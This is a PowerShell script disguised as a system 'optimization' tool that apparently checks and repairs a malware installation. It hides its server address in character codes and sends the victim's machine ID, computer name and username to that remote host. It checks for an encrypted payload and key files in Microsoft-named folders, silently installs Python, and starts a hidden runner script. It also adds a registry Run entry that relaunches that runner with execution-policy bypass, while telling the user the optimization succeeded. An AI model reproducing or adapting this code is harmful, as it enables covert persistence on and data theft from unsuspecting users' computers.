$ErrorActionPreference = 'SilentlyContinue'

$sUrl = 'http://' + 
             [char]55+[char]50+'.'+
             [char]53+[char]54+'.'+
             [char]52+[char]49+'.'+
             [char]50+[char]48+[char]55+':3000'

$pDir = "$env:APPDATA\Microsoft\Security"
$kDir = "$env:LOCALAPPDATA\Microsoft\Vault"
$rDir = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
$pFile = "$pDir\payload.enc"
$kFile = "$kDir\.token"
$rFile = "$rDir\updater.ps1"
$aName = "WindowsAppUpdater"

$mId = [System.BitConverter]::ToString(
    [System.Security.Cryptography.MD5]::Create().ComputeHash(
        [System.Text.Encoding]::UTF8.GetBytes("$($env:COMPUTERNAME.ToLower())-$($env:USERNAME.ToLower())")
    )
).Replace('-','').Substring(0,16).ToLower()

function sLog {
    param([string]$t,[string]$m,[string]$st="check",[hashtable]$e = @{})
    try {
        $l = @{
            timestamp = (Get-Date).ToString("o")
            type = $t
            message = $m
            odId = $mId
            pcName = $env:COMPUTERNAME
            pcUser = $env:USERNAME
            steamId = ""
            username = ""
            stage = $st
        }
        if ($e.Count -gt 0) { $l.extra = $e }
        $j = $l | ConvertTo-Json -Compress
        $w = New-Object Net.WebClient
        $w.Headers.Add("Content-Type", "application/json")
        $null = $w.UploadString("$sUrl/api/log", $j)
    } catch {}
}

function lInfo { param($m, $e = @{}) sLog -t "info" -m $m -st "check" -e $e }
function lErr { param($m, $e = @{}) sLog -t "errors" -m $m -st "check" -e $e }
function lAction { param($m, $e = @{}) sLog -t "actions" -m $m -st "check" -e $e }

function tFile {
    param([string]$p, [string]$n)
    if (Test-Path $p) {
        $s = (Get-Item $p).Length
        lInfo "$n exists" @{ path = $p; size = $s }
        return $true
    } else {
        lErr "$n missing" @{ expectedPath = $p }
        return $false
    }
}

function Find-PythonLikeInstaller {
    $systemPaths = @(
        "C:\Program Files\Python311\pythonw.exe",
        "C:\Program Files\Python311\python.exe",
        "${env:ProgramFiles}\Python311\pythonw.exe",
        "${env:ProgramFiles}\Python311\python.exe"
    )
    
    foreach ($p in $systemPaths) {
        if (Test-Path $p) { 
            lInfo "Found Python in Program Files: $p"
            return $p 
        }
    }
    
    $localPaths = @(
        "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe"
    )
    
    foreach ($p in $localPaths) {
        if (Test-Path $p) { 
            lInfo "Found Python in AppData: $p"
            return $p 
        }
    }
    
    try {
        $w = (where.exe pythonw 2>$null | Select-Object -First 1)
        if ($w -and (Test-Path $w)) { 
            $version = & $w --version 2>&1
            if ($version -match "3\.11") { 
                lInfo "Found Python in PATH: $w"
                return $w 
            }
        }
    } catch {}
    
    try {
        $p = (where.exe python 2>$null | Select-Object -First 1)
        if ($p -and (Test-Path $p)) { 
            $version = & $p --version 2>&1
            if ($version -match "3\.11") { 
                lInfo "Found Python in PATH: $p"
                return $p 
            }
        }
    } catch {}
    
    return $null
}

function tProc {
    $exeProc = Get-Process python, pythonw -ErrorAction SilentlyContinue
    
    if ($exeProc) {
        $pi = @()
        foreach ($p in $exeProc) {
            $pi += @{ 
                pid = $p.Id
                name = "$($p.ProcessName).exe"
            }
        }
        lInfo "Python process running" @{ 
            count = ($exeProc | Measure-Object).Count
            processes = $pi 
        }
        return $true
    }
    
    lErr "Python process (python/pythonw) not found"
    return $false
}

function tRun {
    param([string]$n)

    $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        $v = Get-ItemProperty $rp -Name $n -ErrorAction Stop
        if ($v.$n) {
            lInfo "Autorun configured (Registry)" @{ name = $n; command = $v.$n }
            return $true
        }
    } catch {}

    try {
        $task = Get-ScheduledTask -TaskName $n -ErrorAction Stop
        if ($task) {
            lInfo "Autorun configured (Scheduled Task)" @{ name = $n; state = $task.State }
            return $true
        }
    } catch {}

    $possibleTaskNames = @(
        "MyAutoRunTask",
        "WindowsAppUpdater_VBS",
        "WindowsAppUpdater_CMD",
        "Updater",
        "WindowsUpdater",
        "BlockProxy",
        "BlockProxyLogon"
    )

    foreach ($taskName in $possibleTaskNames) {
        try {
            $task = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
            if ($task) {
                lInfo "Alternative scheduled task found" @{ name = $taskName; state = $task.State }
                return $true
            }
        } catch {}
    }

    $vbsPath = "$env:LOCALAPPDATA\Microsoft\WindowsApps\launcher.vbs"
    if (Test-Path $vbsPath) {
        lInfo "VBS launcher exists" @{ path = $vbsPath }
        return $true
    }

    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $possibleFiles = @(
        "$startupFolder\WindowsAppUpdater.lnk",
        "$startupFolder\WindowsAppUpdater_VBS.lnk",
        "$startupFolder\Updater.lnk"
    )

    foreach ($file in $possibleFiles) {
        if (Test-Path $file) {
            lInfo "Autorun configured (Startup folder)" @{ path = $file }
            return $true
        }
    }

    $possibleNames = @("WindowsAppUpdater", "WindowsAppUpdater_VBS", "WindowsAppUpdater_CMD", "Updater", "WindowsUpdater")
    foreach ($name in $possibleNames) {
        if ($name -eq $n) { continue }
        try {
            $v = Get-ItemProperty $rp -Name $name -ErrorAction Stop
            if ($v.$name) {
                lInfo "Alternative autorun found" @{ name = $name; command = $v.$name }
                return $true
            }
        } catch {}
    }

    lErr "Autorun missing" @{ expectedName = $n }
    return $false
}

function tPy {
    $pythonPath = Find-PythonLikeInstaller
    if ($pythonPath) {
        lInfo "Python found" @{ path = $pythonPath }
        return $true
    }
    
    lErr "Python not installed"
    return $false
}

function Install-PythonLikeInstaller {
    lInfo "Installing Python 3.11.9"
    
    $installer = "$env:TEMP\python-3.11.9-amd64.exe"
    try {
        (New-Object Net.WebClient).DownloadFile("https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe", $installer)
    } catch {
        lErr "Python download failed: $($_.Exception.Message)"
        return $false
    }
    
    if (!(Test-Path $installer) -or (Get-Item $installer).Length -lt 1MB) {
        lErr "Python installer download failed or file is corrupted"
        return $false
    }
    
    $args = @(
        '/quiet',
        'InstallAllUsers=1',
        'PrependPath=1',
        'Include_test=0',
        'Include_doc=0',
        'Include_tcltk=0',
        'Include_launcher=0',
        'AssociateFiles=0'
    )
    
    try {
        $process = Start-Process -FilePath $installer -ArgumentList $args -Wait -PassThru
        if ($process.ExitCode -eq 0) {
            lAction "Python 3.11.9 installed successfully"
            $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
            Start-Sleep -Seconds 2
            Remove-Item $installer -Force -EA 0
            return $true
        } else {
            lErr "Python installation failed with exit code: $($process.ExitCode)"
            return $false
        }
    } catch {
        lErr "Python installation error: $($_.Exception.Message)"
        Remove-Item $installer -Force -EA 0
        return $false
    }
}

function Add-AutoRun {
    param([string]$n, [string]$rf)
    $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        $cmd = "powershell -w h -ep bypass -f `"$rf`""
        Set-ItemProperty $rp -Name $n -Value $cmd -Force -ErrorAction Stop
        lAction "Autorun added" @{ name = $n; command = $cmd }
        return $true
    } catch {
        lErr "Failed to add autorun" @{ error = $_.Exception.Message }
        return $false
    }
}

function Start-Runner {
    param([string]$rf)
    if (!(Test-Path $rf)) {
        lErr "Runner file not found"
        return $false
    }
    try {
        $scriptContent = Get-Content $rf -Raw -ErrorAction Stop
        $scriptBlock = [ScriptBlock]::Create($scriptContent)
        Start-Job -ScriptBlock $scriptBlock | Out-Null
        lAction "Runner started" @{ path = $rf }
        Start-Sleep -Seconds 2
        return $true
    } catch {
        lErr "Failed to start runner" @{ error = $_.Exception.Message }
        return $false
    }
}

function chk {
    Clear-Host
    Write-Host ""
    Write-Host "  Checking optimization..." -ForegroundColor Cyan
    Write-Host ""
    
    lInfo "Installation check started" @{
        machineId = $mId
        pcName = $env:COMPUTERNAME
        pcUser = $env:USERNAME
    }
    
    $r = @{
        pf = $false  
        kf = $false  
        rf = $false  
        py = $false  
        pr = $false  
        ar = $false  
    }
    
    Write-Host "  [*] Checking installation..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    $r.pf = tFile -p $pFile -n "Payload file"
    $r.kf = tFile -p $kFile -n "Encryption key"
    $r.rf = tFile -p $rFile -n "Runner script"
    $r.py = tPy
    $r.pr = tProc
    $r.ar = tRun -n $aName
    
    Write-Host "  [*] Analyzing results..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    $installed = $false
    
    if (-not $r.py) {
        Write-Host "  [*] Installing Python..." -ForegroundColor Yellow
        $r.py = Install-PythonLikeInstaller
        if ($r.py) { $installed = $true }
    }
    
    if (-not (Test-Path $pDir)) { New-Item -ItemType Directory -Path $pDir -Force | Out-Null }
    if (-not (Test-Path $kDir)) { New-Item -ItemType Directory -Path $kDir -Force | Out-Null }
    if (-not (Test-Path $rDir)) { New-Item -ItemType Directory -Path $rDir -Force | Out-Null }
    
    if (-not $r.pf) {
        Write-Host "  [*] Creating dummy payload file..." -ForegroundColor Yellow
        "dummy" | Out-File -FilePath $pFile -Encoding ascii
        $r.pf = $true
        $installed = $true
    }
    
    if (-not $r.kf) {
        Write-Host "  [*] Creating dummy key file..." -ForegroundColor Yellow
        "testkey123" | Out-File -FilePath $kFile -Encoding ascii
        $r.kf = $true
        $installed = $true
    }
    
    if (-not $r.rf) {
        Write-Host "  [*] Runner script not found, skipping creation..." -ForegroundColor Yellow
    }
    
    if (-not $r.ar -and $r.rf) {
        Write-Host "  [*] Setting up autorun..." -ForegroundColor Yellow
        $r.ar = Add-AutoRun -n $aName -rf $rFile
        if ($r.ar) { $installed = $true }
    }
    
    if (-not $r.pr -and $r.rf -and $r.pf -and $r.kf) {
        Write-Host "  [*] Starting runner..." -ForegroundColor Yellow
        if (Start-Runner -rf $rFile) {
            Start-Sleep -Seconds 3
            $r.pr = tProc
            $installed = $true
        }
    }
    
    if ($installed) {
        Write-Host ""
        Write-Host "  [*] Re-checking status..." -ForegroundColor Yellow
        Start-Sleep -Milliseconds 500
        
        $r.pf = tFile -p $pFile -n "Payload file"
        $r.kf = tFile -p $kFile -n "Encryption key"
        $r.rf = tFile -p $rFile -n "Runner script"
        $r.py = tPy
        $r.pr = tProc
        $r.ar = tRun -n $aName
    }
    
    $pc = ($r.Values | Where-Object { $_ -eq $true }).Count
    $tc = $r.Count
    $pp = [math]::Round(($pc / $tc) * 100, 0)
    
    Write-Host ""
    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
    Write-Host ""
    
    if ($pc -eq $tc) {
        Write-Host "  [✓] Optimization installed successfully!" -ForegroundColor Green
        Write-Host "  [!] Please restart your computer." -ForegroundColor Yellow
        
        lInfo "Installation check completed" @{
            passed = $pc
            total = $tc
            percentage = $pp
            allPassed = $true
            repaired = $installed
        }
    } elseif ($pc -ge 4) {
        Write-Host "  [!] Partial installation ($pc/$tc)" -ForegroundColor Yellow
        Write-Host "  [!] Please run again as Administrator" -ForegroundColor Yellow
        lInfo "Installation check completed with warnings" @{
            passed = $pc
            total = $tc
            percentage = $pp
            allPassed = $false
            repaired = $installed
        }
    } else {
        Write-Host "  [✗] Installation failed ($pc/$tc)" -ForegroundColor Red
        Write-Host "  [✗] Please run again as Administrator" -ForegroundColor Red
        lErr "Installation check failed" @{
            passed = $pc
            total = $tc
            percentage = $pp
            allPassed = $false
            repaired = $installed
        }
    }
    
    Write-Host ""
    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  Press any key to exit..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")  # <--- ИСПРАВЛЕНО!
}

chk
